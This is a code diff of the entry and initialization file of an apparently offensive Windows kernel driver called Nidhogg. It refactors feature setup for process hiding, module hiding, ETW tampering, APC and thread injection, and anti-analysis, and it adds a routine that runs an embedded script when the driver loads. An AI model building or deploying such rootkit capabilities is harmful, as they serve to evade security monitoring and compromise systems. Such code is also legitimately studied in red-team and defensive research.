@@ -10,7 +10,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	Features.ProcessProtection = false;
 	Features.ThreadProtection = false;
 	Features.RegistryFeatures = false;
-	KdPrint((DRIVER_PREFIX "Driver is being reflectively loaded...\n"));
+	Print(DRIVER_PREFIX "Driver is being reflectively loaded...\n");
 
 	UNICODE_STRING driverName = RTL_CONSTANT_STRING(DRIVER_NAME);
 	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
@@ -22,7 +22,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	NTSTATUS status = IoCreateDriver(&driverName, &NidhoggEntry);
 
 	if (!NT_SUCCESS(status))
-		KdPrint((DRIVER_PREFIX "Failed to create driver: (0x%08X)\n", status));
+		Print(DRIVER_PREFIX "Failed to create driver: (0x%08X)\n", status);
 	return status;
 #endif
 
@@ -43,10 +43,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
 	NTSTATUS status = STATUS_SUCCESS;
-	InitializeFeatures();
 
-	if (WindowsBuildNumber < WIN_1507)
+	if (!InitializeFeatures()) {
+		ClearAll();
 		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
+	}
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
@@ -59,15 +60,17 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status));
+		Print(DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status);
+		ClearAll();
 		return status;
 	}
 
 	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status));
+		Print(DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status);
 		IoDeleteDevice(DeviceObject);
+		ClearAll();
 		return status;
 	}
 
@@ -96,16 +99,16 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);
 
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status));
+			Print(DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status);
 			status = STATUS_SUCCESS;
 			Features.ProcessProtection = false;
 			Features.ThreadProtection = false;
 		}
 
-		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
+		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryUtils->RegCookie, nullptr);
 
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status));
+			Print(DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status);
 			status = STATUS_SUCCESS;
 			Features.RegistryFeatures = false;
 		}
@@ -120,7 +123,9 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = NidhoggCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;
 
-	KdPrint((DRIVER_PREFIX "Initialization finished.\n"));
+	ExecuteInitialOperations();
+
+	Print(DRIVER_PREFIX "Initialization finished.\n");
 	return status;
 }
 
@@ -135,13 +140,13 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 * There is no return value.
 */
 void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
-	KdPrint((DRIVER_PREFIX "Unloading...\n"));
+	Print(DRIVER_PREFIX "Unloading...\n");
 
 	if (Features.RegistryFeatures) {
-		NTSTATUS status = CmUnRegisterCallback(rGlobals.RegCookie);
+		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryUtils->RegCookie);
 
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status));
+			Print(DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status);
 		}
 	}
 
@@ -156,6 +161,49 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
 	IoDeleteSymbolicLink(&symbolicLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
+}
+
+/*
+* Description:
+* ExecuteInitialOperations is responsible for executing initial opeartions script.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
+void ExecuteInitialOperations() {
+	ScriptManager* scriptManager = nullptr;
+	ScriptInformation scriptInfo{};
+
+	if (InitialOperationsSize == 0 || !InitialOperations)
+		return;
+
+	scriptInfo.ScriptSize = InitialOperationsSize;
+	MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
+	NTSTATUS status = scriptAllocator.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);
+
+	if (!NT_SUCCESS(status))
+		return;
+
+	__try {
+		scriptManager = new ScriptManager();
+		status = scriptManager->ExecuteScript((PUCHAR)scriptInfo.Script, scriptInfo.ScriptSize);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		status = GetExceptionCode();
+	}
+
+	if (scriptManager) {
+		delete scriptManager;
+		scriptManager = nullptr;
+	}
+
+	if (!NT_SUCCESS(status))
+		Print(DRIVER_PREFIX "Failed to execute initial operations (0x%08X)\n", status);
+	else
+		Print(DRIVER_PREFIX "Executed initial opeartions successfully.\n");
 }
 
 /*
@@ -187,58 +235,12 @@ NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 * There is no return value.
 */
 void ClearAll() {
-	// Clearing the process array.
-	AutoLock processProtectingLocker(pGlobals.Lock);
-
-	memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
-	pGlobals.ProtectedProcesses.PidsCount = 0;
-
-	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
-		pGlobals.HiddenProcesses.Processes[i].ListEntry = NULL;
-		pGlobals.HiddenProcesses.Processes[i].Pid = 0;
-	}
-	pGlobals.HiddenProcesses.PidsCount = 0;
-
-	// Clearing the thread array.
-	AutoLock threadProtectingLocker(tGlobals.Lock);
-
-	memset(&tGlobals.ProtectedThreads.Threads, 0, sizeof(tGlobals.ProtectedThreads.Threads));
-	tGlobals.ProtectedThreads.TidsCount = 0;
-
-	// Clearing the files array.
-	AutoLock filesLocker(fGlobals.Lock);
-
-	for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
-		ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
-		fGlobals.Files.FilesPath[i] = nullptr;
-		fGlobals.Files.FilesCount--;
-	}
-
-	// Uninstalling NTFS hooks if there are any.
-	if (fGlobals.Callbacks[0].Activated)
-		UninstallNtfsHook(IRP_MJ_CREATE);
-
-	// Clearing the registry keys and values.
-	AutoLock registryLocker(rGlobals.Lock);
-
-	for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-		rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
-	}
-	rGlobals.ProtectedItems.Keys.KeysCount = 0;
-
-	for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-		ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-		rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
-		rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
-	}
-	rGlobals.ProtectedItems.Values.ValuesCount = 0;
-
-	// Clearing the anti analysis tampered callbacks.
-	AutoLock antianalysisLocker(aaGlobals.Lock);
-	memset(aaGlobals.DisabledCallbacks, 0, sizeof(aaGlobals.DisabledCallbacks));
-	aaGlobals.DisabledCallbacksCount = 0;
+	delete NidhoggProccessUtils;
+	delete NidhoggFileUtils;
+	delete NidhoggMemoryUtils;
+	delete NidhoggAntiAnalysis;
+	delete NidhoggRegistryUtils;
+	delete NidhoggNetworkUtils;
 }
 
 /*
@@ -251,70 +253,76 @@ void ClearAll() {
 * Returns:
 * There is no return value.
 */
-void InitializeFeatures() {
-	UNICODE_STRING routineName;
-
-	// Initialize globals.
-	tGlobals.Init();
-	pGlobals.Init();
-	fGlobals.Init();
-	rGlobals.Init();
-	aaGlobals.Init();
-
+bool InitializeFeatures() {
 	// Get windows version.
 	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
 	NTSTATUS result = RtlGetVersion(&osVersion);
 
-	if (NT_SUCCESS(result))
-		WindowsBuildNumber = osVersion.dwBuildNumber;
+	if (!NT_SUCCESS(result))
+		return false;
+
+	WindowsBuildNumber = osVersion.dwBuildNumber;
 
 	if (WindowsBuildNumber < WIN_1507)
-		return;
+		return false;
+
+	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"ExAllocatePool2");
+	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);
+
+	// Initialize utils.
+	NidhoggProccessUtils = new ProcessUtils();
+
+	if (!NidhoggProccessUtils)
+		return false;
+
+	NidhoggFileUtils = new FileUtils();
+
+	if (!NidhoggFileUtils)
+		return false;
+
+	NidhoggMemoryUtils = new MemoryUtils();
+
+	if (!NidhoggMemoryUtils)
+		return false;
+
+	NidhoggAntiAnalysis = new AntiAnalysis();
+
+	if (!NidhoggAntiAnalysis)
+		return false;
+
+	NidhoggRegistryUtils = new RegistryUtils();
+
+	if (!NidhoggRegistryUtils)
+		return false;
+
+	NidhoggNetworkUtils = new NetworkUtils();
+
+	if (!NidhoggNetworkUtils)
+		return false;
 
 	// Initialize functions.
-	RtlInitUnicodeString(&routineName, L"MmCopyVirtualMemory");
-	MmCopyVirtualMemory = (tMmCopyVirtualMemory)MmGetSystemRoutineAddress(&routineName);
-
-	if (!MmCopyVirtualMemory)
+	if (!(PULONG)MmCopyVirtualMemory)
 		Features.ReadData = false;
 
-	RtlInitUnicodeString(&routineName, L"ZwProtectVirtualMemory");
-	ZwProtectVirtualMemory = (tZwProtectVirtualMemory)MmGetSystemRoutineAddress(&routineName);
-
-	if (!ZwProtectVirtualMemory || !Features.ReadData)
+	if (!(PULONG)ZwProtectVirtualMemory || !Features.ReadData)
 		Features.WriteData = false;
 
-	RtlInitUnicodeString(&routineName, L"PsGetProcessPeb");
-	PsGetProcessPeb = (tPsGetProcessPeb)MmGetSystemRoutineAddress(&routineName);
-
-	if (!Features.WriteData || !PsGetProcessPeb)
+	if (!Features.WriteData || !(PULONG)PsGetProcessPeb)
 		Features.FunctionPatching = false;
 
-	RtlInitUnicodeString(&routineName, L"ObReferenceObjectByName");
-	ObReferenceObjectByName = (tObReferenceObjectByName)MmGetSystemRoutineAddress(&routineName);
+	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList || !&PsLoadedModuleResource)
+		Features.ModuleHiding = false;
 
-	if (!ObReferenceObjectByName)
+	if (!(PULONG)ObReferenceObjectByName)
 		Features.FileProtection = false;
 
-	RtlInitUnicodeString(&routineName, L"KeInitializeApc");
-	KeInitializeApc = (tKeInitializeApc)MmGetSystemRoutineAddress(&routineName);
-	RtlInitUnicodeString(&routineName, L"KeInsertQueueApc");
-	KeInsertQueueApc = (tKeInsertQueueApc)MmGetSystemRoutineAddress(&routineName);
-	RtlInitUnicodeString(&routineName, L"KeTestAlertThread");
-	KeTestAlertThread = (tKeTestAlertThread)MmGetSystemRoutineAddress(&routineName);
-	RtlInitUnicodeString(&routineName, L"ZwQuerySystemInformation");
-	ZwQuerySystemInformation = (tZwQuerySystemInformation)MmGetSystemRoutineAddress(&routineName);
-
-	if (!KeInsertQueueApc)
+	if (!(PULONG)KeInsertQueueApc)
 		Features.EtwTiTamper = false;
 
-	if (!KeInitializeApc || !KeInsertQueueApc || !KeTestAlertThread || !ZwQuerySystemInformation)
+	if (!(PULONG)KeInitializeApc || !(PULONG)KeInsertQueueApc || !(PULONG)KeTestAlertThread || !(PULONG)ZwQuerySystemInformation)
 		Features.ApcInjection = false;
 
-	if (NT_SUCCESS(GetSSDTAddress())) {
-		NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
-
-		if (NtCreateThreadEx)
-			Features.CreateThreadInjection = true;
-	}
+	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
+		Features.CreateThreadInjection = true;
+	return true;
 }
